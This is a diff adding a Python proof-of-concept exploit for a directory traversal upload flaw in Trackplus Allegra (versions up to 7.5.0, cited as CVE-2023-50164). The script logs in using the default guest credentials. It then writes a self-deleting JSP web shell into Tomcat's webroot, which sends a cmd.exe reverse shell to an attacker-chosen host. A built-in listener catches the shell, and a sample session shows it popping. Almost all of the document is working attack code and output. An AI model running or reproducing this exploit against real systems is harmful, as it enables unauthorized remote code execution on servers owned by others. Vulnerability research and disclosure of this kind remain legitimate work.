@@ -1,0 +1,164 @@
+#!/usr/bin/env python3
+"""
+Trackplus Allegra Service Desk Module UploadHelper upload Directory Traversal Remote Code Execution Vulnerability
+Version: <= 7.5.0, bug was patched in 7.5.1
+Vendor Advisory: https://www.trackplus.com/en/service/release-notes-reader/7-5-1-release-notes-2.html
+
+# Summary
+
+An authenticated guest attacker can execute arbitrary code by exploiting CVE-2023-50164.
+
+# Notes
+
+Even though authentication is required, an attacker can register a guest account by default on the target system. If that is not enough, there are several auth bypasses and default accounts enabled.
+
+# Example
+
+```
+steven@DESKTOP-DHOMH1S:~$ ./poc.py
+(+) usage: ./poc.py <target> <usr:pwd> <connectback>
+(+) eg: ./poc.py 192.168.18.194 guest:trackplus 172.22.196.48
+
+steven@DESKTOP-DHOMH1S:~$ ./poc.py 192.168.18.194 guest:trackplus 172.22.196.48
+(+) obtained jsessionid A0149319749F14B6117CF5E1C964FBFF
+(+) exploited CVE-2023-50164, uploaded ktnqiecy.jsp
+(+) starting handler on port 1234
+(+) connection from 172.22.192.1
+(+) pop thy shell!
+Microsoft Windows [Version 10.0.21996.1]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0>whoami
+whoami
+nt authority\local service
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0>
+```
+"""
+import re
+import sys
+import random
+import string
+import requests
+import socket
+from threading import Thread
+from telnetlib import Telnet
+from colorama import Fore, Style, Back
+
+def get_random_string(length):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
+def _get_jsp(ls, lp):
+    jsp = f"""<%@page import="java.lang.*"%>
+<%@page import="java.util.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%
+  // delete itself
+  File f = new File(application.getRealPath("/" + this.getClass().getSimpleName().replaceFirst("_",".")));
+  f.delete();
+  class StreamConnector extends Thread
+  {{
+    InputStream sv;
+    OutputStream tp;
+    StreamConnector( InputStream sv, OutputStream tp )
+    {{
+      this.sv = sv;
+      this.tp = tp;
+    }}
+    public void run()
+    {{
+      BufferedReader za  = null;
+      BufferedWriter hjr = null;
+      try
+      {{
+        za  = new BufferedReader( new InputStreamReader( this.sv ) );
+        hjr = new BufferedWriter( new OutputStreamWriter( this.tp ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = za.read( buffer, 0, buffer.length ) ) > 0 )
+        {{
+          hjr.write( buffer, 0, length );
+          hjr.flush();
+        }}
+      }} catch( Exception e ){{}}
+      try
+      {{
+        if( za != null )
+          za.close();
+        if( hjr != null )
+          hjr.close();
+      }} catch( Exception e ){{}}
+    }}
+  }}
+  try
+  {{
+    String ShellPath = new String("cmd.exe");
+    Socket socket = new Socket("{ls}", {lp});
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  }} catch( Exception e ) {{}}
+%>"""
+    return jsp
+
+def login(target, usr, pwd):
+    r = requests.get(f"http://{target}/allegra/logon!restLogin.action", allow_redirects=False, params={
+        "j_username" : usr,
+        "j_password" : pwd
+    })
+    assert "Set-Cookie" in r.headers, "(-) login failed, no cookie!"
+    m = re.search("^JSESSIONID=(.{32})", r.headers['set-cookie'])
+    assert m, "(-) login failed, check credentials!"
+    return m.group(1)
+
+def upload(t, h, p, sid):
+    uri = f"http://{t}/allegra/excelUpload.action"
+    s = f"{get_random_string(8)}.jsp"
+    r = requests.post(uri, params={
+        "uploadFileFileName": f"../../../../Program Files/Apache Software Foundation/Tomcat 9.0/webapps/ROOT/{s}",
+    }, files={
+        'UploadFile': ("junk.txt", _get_jsp(h, p), 'text/si')
+    }, cookies={
+        "JSESSIONID" : sid
+    }, allow_redirects=False)
+    assert r.status_code == 302, "(-) upload failed"
+    return s
+
+def handler(lp):
+    print(f"(+) starting handler on port {lp}")
+    t = Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"(+) connection from {addr[0]}")
+    t.sock = conn
+    print(f"(+) {Fore.RED + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
+    t.interact()
+
+def main():
+    if len(sys.argv) != 4:
+        print(f"(+) usage: {sys.argv[0]} <target> <usr:pwd> <connectback>")
+        print(f"(+) eg: {sys.argv[0]} 192.168.18.194 guest:trackplus 172.22.196.48")
+        sys.exit(1)
+    t = sys.argv[1]
+    c = sys.argv[2]
+    assert ":" in c, "(-) username and password not formatted correctly! <username:password>"
+    h = sys.argv[3]
+    p = 1234
+    if ":" in sys.argv[3]:
+        p = int(sys.argv[3].split(":")[1])
+        h = sys.argv[3].split(":")[0]
+    # default guest account is guest/trackplus but an attacker can register their own anyway
+    sid = login(t, c.split(":")[0], c.split(":")[1])
+    print(f"(+) obtained jsessionid {sid}")
+    s = upload(t, h, p, sid)
+    print(f"(+) exploited CVE-2023-50164, uploaded {s}")
+    handlerthr = Thread(target=handler, args=[p])
+    handlerthr.start()
+    requests.get(f"http://{t}/{s}")
+
+if __name__ == '__main__':
+    main()
